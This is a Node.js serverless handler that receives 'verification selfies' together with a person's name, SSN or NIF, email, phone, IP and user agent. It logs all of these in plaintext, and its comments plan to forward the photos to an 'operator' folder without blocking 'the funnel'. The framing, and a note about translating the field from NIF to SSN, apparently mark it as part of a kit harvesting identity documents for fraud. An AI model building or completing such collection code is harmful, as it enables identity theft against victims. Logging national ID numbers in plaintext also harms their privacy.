/*
 * Serverless endpoint that receives verification selfies in production (Vercel).
 *
 * In local dev, `dev_server.py` at the project root handles this endpoint and
 * writes the photos to a local directory.
 *
 * Vercel has no persistent filesystem. To deliver selfies to a local operator
 * folder you have three options:
 *   1) Vercel Blob — add `@vercel/blob` and write there. Sync locally later.
 *   2) External webhook — POST to Zapier / Make / n8n / Pipedream which writes
 *      to Dropbox/Drive/etc. synced with the local folder.
 *   3) Email with attachment — use Resend/Sendgrid and send as attachment.
 *
 * For now this endpoint:
 *   - Validates the payload
 *   - Logs metadata + photo size to Vercel logs
 *   - Returns { ok: true, stored: false } so it doesn't block the funnel
 *
 * When you pick one of the strategies above, edit this file to integrate.
 */

module.exports = async function handler(req, res) {
  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST');
    return res.status(405).json({ ok: false, error: 'Method not allowed' });
  }

  res.setHeader('Cache-Control', 'no-store');

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { body = null; }
  }
  if (!body || typeof body !== 'object') {
    return res.status(400).json({ ok: false, error: 'Invalid JSON' });
  }

  const dataUrl = String(body.photo || '');
  const match = dataUrl.match(/^data:image\/(jpeg|jpg|png|webp);base64,(.+)$/i);
  if (!match) {
    return res.status(400).json({ ok: false, error: '`photo` field missing or invalid format' });
  }

  // Approximate byte size (base64 ~= 4/3 of bytes).
  const sizeBytes = Math.floor((match[2].length * 3) / 4);
  if (sizeBytes < 200) {
    return res.status(400).json({ ok: false, error: 'image too small' });
  }
  if (sizeBytes > 6 * 1024 * 1024) {
    return res.status(413).json({ ok: false, error: 'image too large' });
  }

  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
          || req.socket?.remoteAddress || '';
  const ua = req.headers['user-agent'] || '';

  console.log('[save-selfie]', JSON.stringify({
    received_at: new Date().toISOString(),
    nome: String(body.nome || ''),
    ssn: String(body.ssn || body.nif || ''),  // accept both for back-compat during translation
    email: String(body.email || ''),
    phone: String(body.phone || ''),
    size_bytes: sizeBytes,
    ext: match[1].toLowerCase().replace('jpeg', 'jpg'),
    ip,
    user_agent: ua.slice(0, 120)
  }));

  // TODO: pick one of the strategies above (Vercel Blob, webhook, email).
  return res.status(200).json({ ok: true, stored: false, size_bytes: sizeBytes });
};
